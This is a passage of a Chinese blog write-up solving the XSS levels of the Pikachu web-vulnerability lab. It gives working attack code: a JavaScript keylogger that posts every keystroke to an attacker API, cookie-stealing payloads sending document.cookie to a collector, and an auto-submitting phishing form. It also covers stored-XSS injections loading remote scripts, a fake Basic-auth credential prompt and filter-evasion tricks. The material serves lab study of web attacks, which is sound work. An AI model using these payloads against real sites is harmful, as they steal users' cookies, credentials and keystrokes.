+<p>可能需要事先理解一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaotank/p/11009796.html">Basic认证的概念</a><br>大概就是，一种很基本的HTTP认证方式</p>
+<ol>
+<li><p>客户端请求</p>
+</li>
+<li><p>服务端判断，没有认证就返回401“未认证”，并给出认证消息<br>具体是在响应header中添加<code>WWW-Authenticate</code>头<br>例如<code>WWW-Authenticate: Basic realm=&quot;你还没有认证&quot;</code><br>客户端收到这个header头，检查到<code>Basic</code>，就会弹出输入框要求认证</p>
+</li>
+<li><p>用户发送认证内容<br>具体是在请求header中添加<code>Authorization</code>头<br>例如<code>Authorization: Basic &#123;BASE64编码后的认证内容&#125;</code><br>JWT好像用的就是这个？注意是编码，不是加密</p>
+</li>
+<li><p>服务端检查认证，返回200&#x2F;403，然后进一步处理</p>
+</li>
+<li><p>此后用户每次请求都带上<code>Authorization</code>头</p>
+</li>
+</ol>
+<hr>
+<p>上述fish.php中的代码大概就是实现了一个简单的Basic弹窗认证<br>通过迷惑性的弹窗内容，让用户输入敏感信息<br>然后将敏感信息发送给攻击者</p>
+<p>具体例子见<a href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS">存储型XSS</a></p>
+<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>攻击者可以先写好下面的键盘记录JS脚本<br>放到攻击者服务器，但是被加载到受害者浏览器的<br>命名为rk.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createAjax</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> request = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>) &#123;</span><br><span class="line">        request = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        <span class="keyword">if</span>(request.<span class="property">overrideMimeType</span>) &#123;</span><br><span class="line">            request.<span class="title function_">overrideMimeType</span>(<span class="string">&quot;text/xml&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> versions = [<span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>, <span class="string">&#x27;MSXML.XMLHTTP&#x27;</span>, <span class="string">&#x27;Msxml2.XMLHTTP.7.0&#x27;</span>,<span class="string">&#x27;Msxml2.XMLHTTP.6.0&#x27;</span>,<span class="string">&#x27;Msxml2.XMLHTTP.5.0&#x27;</span>, <span class="string">&#x27;Msxml2.XMLHTTP.4.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.3.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP&#x27;</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;versions.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                request = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(versions[i]);</span><br><span class="line">                <span class="keyword">if</span>(request) &#123;</span><br><span class="line">                    <span class="keyword">return</span> request;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">                request=<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> request;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ajax = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> xl = <span class="string">&quot;datax=&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onkeypress</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> realkey = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(event.<span class="property">keyCode</span>);</span><br><span class="line">    xl += realkey;</span><br><span class="line">    <span class="title function_">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeypress</span> = onkeypress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    ajax = <span class="title function_">createAjax</span>();</span><br><span class="line">    ajax.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ajax.<span class="property">readyState</span> == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ajax.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> data = ajax.<span class="property">responseText</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;页面请求失败&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将键盘记录发送到接收API：rkserver.php</span></span><br><span class="line">    <span class="keyword">var</span> postdate = xl;</span><br><span class="line">    ajax.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://www.pikachu.com/pkxss/rkeypress/rkserver.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">    ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-length&quot;</span>, postdate.<span class="property">length</span>);</span><br><span class="line">    ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Connection&quot;</span>, <span class="string">&quot;close&quot;</span>);</span><br><span class="line">    ajax.<span class="title function_">send</span>(postdate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着攻击者还得准备一个接收记录的API：rkserver.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//数据库连接设置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置允许被跨域访问</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Origin:*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;datax&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;insert keypress(data) values(&#x27;<span class="subst">$data</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="variable">$query</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下面要做的，就是在存在存储型XSS漏洞的页面<br>打入一个payload，使受害者加载rk.js，并确保JS脚本能够起作用（例如能跨域）<br>这样受害者的键盘记录都会被攻击者记录</p>
+<p>具体例子见<a href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS">存储型XSS</a></p>
+<h3 id="反射型XSS（GET）"><a href="#反射型XSS（GET）" class="headerlink" title="反射型XSS（GET）"></a>反射型XSS（GET）</h3><p>先看看有没有回显，输入，有</p>
+<p>try，能X到本页面，<del>发现有前端长度限制，改HTML，</del>X爆<br>（实际上不用改前端HTML也行，直接修改URL中的参数即可）</p>
+<p>观察URL，是GET传递payload：<br><code>http://www.pikachu.com/vul/xss/xss_reflected_get.php?message=Archeri&amp;submit=submit</code></p>
+<p>弹窗测试成功：<br><code>http://www.pikachu.com/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E&amp;submit=submit</code></p>
+<p>下面模拟攻击者发现了这里有反射型XSS漏洞-GET</p>
+<p>攻击者准备好了<a href="#cookie%E6%90%9C%E9%9B%86">上述的恶意服务器</a>，构造XSS脚本：<br><code>&lt;script&gt;document.location=&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code></p>
+<p>然后形成payload构造钓鱼连接，注意URL编码处理，否则不一定能起作用：<br><code>http://www.pikachu.com/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fwww.pikachu.com%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E&amp;submit=submit</code></p>
+<p>然后通过社工方法，引诱受害者点击&#x2F;加载链接<br>这里直接地址栏输入访问….<br>结果是，会短暂出现Pikachu靶场的页面，随即跳转至百度</p>
+<p>然后看看攻击者后台，收集到了cookie记录：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211030093943556.png" alt="image-20211030093943556"></p>
+<h3 id="反射型XSS（POST）"><a href="#反射型XSS（POST）" class="headerlink" title="反射型XSS（POST）"></a>反射型XSS（POST）</h3><p>登录框，要求先登录？</p>
+<p>那就<code>admin/123456</code>登进去，然后同样是一样的输入框</p>
+<p>测试XSS，能X到本页面，X爆<br>但是这次URL没有显示输入</p>
+<p>抓包看看，发现是POST方法，<code>message</code>字段存在XSS漏洞</p>
+<p>查看页面源码<br><strong>表单action字段为空，加上页面本身是php页面</strong><br><strong>说明数据是通过POST提交给页面本身，页面本身再作出响应</strong></p>
+<p>所以URL直接钓鱼这一块可能不太行<br>得自己构造恶意页面，包含一个恶意表单<br>来将信息发送到攻击者捕获cookie的API</p>
+<p>于是有如下钓鱼页面，文件命名为post.html：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://www.pikachu.com/vul/xss/xsspost/xss_reflected_post.php&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;xssr_in&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;script&gt;document.location = &#x27;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;&lt;/script&gt;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>解析一下：</p>
+<ul>
+<li>body的表单那里，提交目标就是发现的有XSS漏洞的页面</li>
+<li>根据之前的测试结果，将<code>message</code>字段的默认值设置为XSS payload</li>
+<li>关键是头部那里的JS脚本，设置成了<strong>页面加载时自动提交表单</strong>（window.onload）</li>
+</ul>
+<p>这样攻击者把这个页面部署到恶意服务器上<br>再形成这个页面的钓鱼链接<br>就可以勾cookie了</p>
+<p>如这个钓鱼链接：<a target="_blank" rel="noopener" href="http://www.pikachu.com/pkxss/xcookie/post.html">http://www.pikachu.com/pkxss/xcookie/post.html</a><br>一点，短暂显示Pikachu靶场页面，随即跳转百度</p>
+<p>查看cookie捕获记录，有了用户名和密码的hash：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211030100459470.png" alt="image-20211030100459470"></p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>一个留言板，留言后回显到页面</p>
+<p>尝试XSS，有，X爆<br>X一个弹框，留在了页面上<br>之后每次访问这个页面都会弹框</p>
+<p>这个时候，大概就<strong>不用考虑什么社工方法</strong>去钓鱼<br>因为攻击者可以直接把payload部署在留言板上<br>每个看到留言板的人都会中招<br>这时候可利用的点也比较多了吧？应该</p>
+<p>先来试试简单的盗cookie<br>payload：<code>一般路过噶迪恩&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#39;+document.cookie+&#39;&quot; width=&quot;0&quot; height=&quot;0&quot; border=&quot;0&quot; /&gt;&#39;)&lt;/script&gt;</code><br>然后页面上就出现了这个看起来很普通的留言：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211030103701947.png" alt="image-20211030103701947"></p>
+<p>但实际上，每个用户浏览到这个留言，都已经偷偷地把cookie发送给了攻击者</p>
+<hr>
+<p>然后试试钓鱼</p>
+<p>根据上面讲到的<a href="#%E4%BF%A1%E6%81%AF%E9%92%93%E9%B1%BC">fish.php</a>，在留言板打入以下payload：<br><code>一般路过噶迪恩&lt;script src=&quot;http://www.pikachu.com/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</code><br>其他用户一浏览就会弹出下面的输入框：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211030115532885.png" alt="image-20211030115532885"></p>
+<p>评论没加载完就弹窗，而且弹窗信息乱码，一看就知道有诈。。。。</p>
+<p>但是下面不管输入多少次，发现都会一直会弹窗<br>debug一下，发现传输用户名密码后PHP那边根本不会设置<code>$_SERVER[&#39;PHP_AUTH_USER&#39;]</code>和<code>$_SERVER[&#39;PHP_AUTH_PW&#39;]</code>这两个字段<br>所以一直没有通不过逻辑检测，会一直要求认证</p>
+<p>冲浪，了解到在Apache里面，若想通过PHP使用Basic认证，只有将PHP<strong>以模块方式运行</strong>才有效。而小皮面板安装时，默认是按CGI模式安装PHP的，因此上面的fish.php不能正常起作用</p>
+<p>解决方法就是重新部署PHP在Apache中的运行模式<br>具体就是编辑Apache的httpd.conf，将类似于下面的配置起作用：<br><code>LoadModule php7_module &quot;D:/php-7.4.9/php7apache2_4.dll&quot;</code><br><code>AddType application/x-httpd-php .php</code><br><code>PHPIniDir &quot;D:/php-7.4.9&quot;</code><br>然后重启服务什么的</p>
+<p>要在小皮面板里改就比较麻烦<br>所谓有利有弊。。。。<br>&#x3D;&#x3D;有缘再弄&#x3D;&#x3D;</p>
+<hr>
+<p>最后再试试键盘记录</p>
+<p>根据上面讲到的<a href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95">rk.js</a>，打入下面的payload</p>
+<p><code>一般路过馆长&lt;script src=&quot;http://www.pikachu.com/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</code></p>
+<p>多了个人畜无害的留言：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211115215151112.png" alt="image-20211115215151112"></p>
+<p>但是恶意脚本已经被加载进了每个浏览到这条评论的用户的浏览器<br>都已经被记录下键盘痕迹了</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211115215633215.png" alt="image-20211115215633215"></p>
+<hr>
+<p><strong>关于跨域</strong></p>
+<p>概念：<strong>协议、域名、端口任一不同，则不同源</strong><br><strong>不包括路径！</strong><br>不同源的资源传输称为跨域</p>
+<p>浏览器默认的同源策略：不同源之间不能使用JS进行交互</p>
+<p>除非特别配置<br>最常见的就是添加header：<code>Access-Control-Allow-Origin:x/com</code><br>来指定允许跨域的地址</p>
+<p>如果<a href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95">接收数据的API</a>取消了这个header：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置不允许被跨域访问（注释掉）</span></span><br><span class="line"><span class="comment">//header(&quot;Access-Control-Allow-Origin:*&quot;);</span></span><br></pre></td></tr></table></figure>
+
+<p><del>那就会出现这种情况：</del></p>
+<p>发现注释掉没用，还是可以记录<br>这是因为攻击者服务器和靶场是同源的（都是一个站点下的内容）。。。。<br>&#x3D;&#x3D;得考虑租台云服务器了&#x3D;&#x3D;</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>输入框，输入提交，下方生成一个链接<br>输入“123”，点击链接：<a target="_blank" rel="noopener" href="http://www.pikachu.com/vul/xss/123">http://www.pikachu.com/vul/xss/123</a><br>那结果肯定是NOT FOUND了</p>
+<p>检视一下元素，发现下面有个<code>&lt;div id=&quot;dom&quot;&gt;&lt;/div&gt;</code>，一开始是空的<br>提交之后变成了<code>&lt;div id=&quot;dom&quot;&gt;&lt;a href=&quot;123&quot;&gt;what do you see&lt;/a&gt;&lt;/div&gt;</code><br>就是动态添加了一个a标签</p>
+<p>看看对应的脚本</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就是通过DOM编程，动态修改文档节点</p>
+<p>倒有点像是注入，尝试主动闭合，构造下面的payload：<br><code>&#39;&gt;&lt;/a&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&lt;a&gt;</code><br>元素变成：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116085142853.png" alt="image-20211116085142853"></p>
+<p>但是并没有弹窗，原来是<strong>script标签不能嵌套在div标签中</strong></p>
+<p>换成考虑：<code>&#39;&gt;&lt;/a&gt;&lt;img src=&quot;123&quot; onerror=alert(&#39;123&#39;) /&gt;&lt;a&gt;</code><br>完成弹窗，证明有DOM型XSS</p>
+<p>或者是<code>&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code><br>HTML变成这样：<br><code>&lt;a href=&quot;&quot; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;&#39;&gt;what do you see?&lt;/a&gt;</code><br>一点击链接就会弹窗</p>
+<hr>
+<p>下面考虑利用，首先抓个包看看，发现抓不到<br>因为是通过本地JS脚本执行的函数，没有数据包流出<br>即是<strong>纯前端的操作</strong><br>那咋利用？</p>
+<p>有些DOM XSS操作也是会在URL中拼接输入的，这种就钓鱼链接<br>但是上面的例子没有拼接到URL</p>
+<p><del>难道只能控制受害者主机？？？</del></p>
+<hr>
+<p>补充点DOM的知识</p>
+<p>DOM相当于在前端提供了一个通过JS去对HTML进行操作的接口</p>
+<p>造成DOM型XSS的原因：<br>前端输入被DOM获取，通过DOM又在前端输出<br>跟反射型和存储型比起来，它是不经过后台交互的（<strong>纯前端</strong>）</p>
+<p>因此DOM型比一般的反射型更加难防护</p>
+<hr>
+<p>上网找找利用场景<br>找不到没有URL拼接的DOM型利用场景啊啊啊啊<br><del>来一手物理黑客</del></p>
+<h3 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h3><p>奇怪的题目，一个脚本：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> str = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span><br><span class="line">	<span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.<span class="title function_">split</span>(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">var</span> xss = txss.<span class="title function_">replace</span>(<span class="regexp">/\+/g</span>, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现有针对URL的操作，具体是截断URL，然后替换‘+’为空格<br>方便XSS<br>也太好人了吧</p>
+<p>然后HTML也很奇怪：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116093312822.png" alt="image-20211116093312822"></p>
+<p>表单是GET提交到本页面，会拼接URL<br>但是那个submit，也没有指出会执行什么操作</p>
+<p>输入“123”，点击，变成这样：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116094051177.png" alt="image-20211116094051177"></p>
+<p>URL变成：<a target="_blank" rel="noopener" href="http://www.pikachu.com/vul/xss/xss_dom_x.php?text=123">http://www.pikachu.com/vul/xss/xss_dom_x.php?text=123</a><br>text参数后面跟了输入内容（哦？）</p>
+<p>多了个div，放了个执行上面脚本的链接<br>点击链接，DOM操作生成节点，类似于上面的DOM型XSS</p>
+<p>检测到有XSS：<code>&#39;&gt;&lt;img src=&quot;e&quot; onerror=alert(&#39;XSS&#39;) /&gt;</code></p>
+<p>直接打入payload：<br><code>&#39;&gt;&lt;img src=&quot;e&quot; onerror=document.location=&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&quot;+document.cookie; /&gt;</code><br>生成链接：<br><a target="_blank" rel="noopener" href="http://www.pikachu.com/vul/xss/xss_dom_x.php?text=%27%3E%3Cimg+src=%22e%22+onerror=document.location=%22http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=%22+document.cookie;+/%3E">http://www.pikachu.com/vul/xss/xss_dom_x.php?text=%27%3E%3Cimg+src%3D%22e%22+onerror%3Ddocument.location%3D%22http%3A%2F%2Fwww.pikachu.com%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B+%2F%3E</a></p>
+<p>然后利用这个链接，再诱惑受害者点击下一个按钮，就可以钓到cookie了</p>
+<h3 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h3><p>一个表单，POST提交到原页面<br>提交后仅回显新增的一个p标签，没有输入内容直接回显</p>
+<p>两个输入框都试了试XSS，但是没什么效果，一点回显都没有</p>
+<p>看看提示，原来管理员有个后台：<br><a target="_blank" rel="noopener" href="http://www.pikachu.com/vul/xss/xssblind/admin.php">http://www.pikachu.com/vul/xss/xssblind/admin.php</a><br>登进去看看，已经弹窗被弹爆了</p>
+<p>看来这类盲打，意思是猜测结果会被提交到后台<br>内容不会显示在原页面<br>打的是管理员，好像比较六臂一点</p>
+<p>那简单了，直接textarea输入框打入payload：<br><code>&lt;script&gt;document.location=&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code><br>然后发现完了，管理员进不了后台了，无限跳转至百度<br>remake</p>
+<p>再来手钓鱼：<br><code>人畜无害朱馆长&lt;script src=&quot;http://www.pikachu.com/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</code></p>
+<p>后台情况，很正常：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116101948914.png" alt="image-20211116101948914"></p>
+<p>但是键盘操作已被记录</p>
+<h3 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h3><p>阁下，请问你觉得人生苦短吗？<br>提交“Yes”，URL拼接，且回显到了原页面：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116102329676.png" alt="image-20211116102329676"></p>
+<p>试试直接X，但是好像被过滤了：<br>payload：<code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code><br>结果：<code>别说这些&#39;&gt;&#39;的话,不要怕,就是干!</code><br>但是URL里面显示正常</p>
+<p>简单试试大小写混拼：<code>SCRipt</code>，发现就绕过了</p>
+<hr>
+<p><strong>一些绕过思路</strong></p>
+<p>这里是<a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">OWASP的绕过备忘录</a><br>&#x3D;&#x3D;有机会看看吧，也在另一份笔记里写写&#x3D;&#x3D;</p>
+<p>这里根据<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45868644/article/details/120192536">别人的博客</a>简单记记</p>
+<p>总体思路分三类（当然可以<strong>抓包修改重放嗯绕</strong>）：</p>
+<ul>
+<li>转换<ul>
+<li>大小写混拼，如<code>&lt;ScRiPt&gt;</code></li>
+<li>双拼，如<code>&lt;scr&lt;script&gt;ipt&gt;</code></li>
+<li>注释干扰，如<code>&lt;scr&lt;!----&gt;ipt&gt;</code></li>
+</ul>
+</li>
+<li>编码<ul>
+<li>要求输出时浏览器能对编码进行识别，变成正常标签从而执行</li>
+<li>如<code>alert(&#39;xss&#39;)</code>不能URL编码：<br><code>alert%28%27xss%27%29</code><br>但能HTML编码：<br><code>&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;</code></li>
+</ul>
+</li>
+<li>其他标签或函数<ul>
+<li>比如换成img、frame等标签</li>
+<li>比如换成onload等函数触发</li>
+</ul>
+</li>
+</ul>
+<p>当然也可以综合使用，想怎么绕怎么绕</p>
+<h3 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h3><p>输入框，GET提交到原页面</p>
+<p>输入“nm”，提示输入已被记录，并且出现跳到“nm”的链接，有回显<br>尝试主动闭合来X：<br><code>&#39; onclick=alert(123) &#39;</code><br>点击就X到了</p>
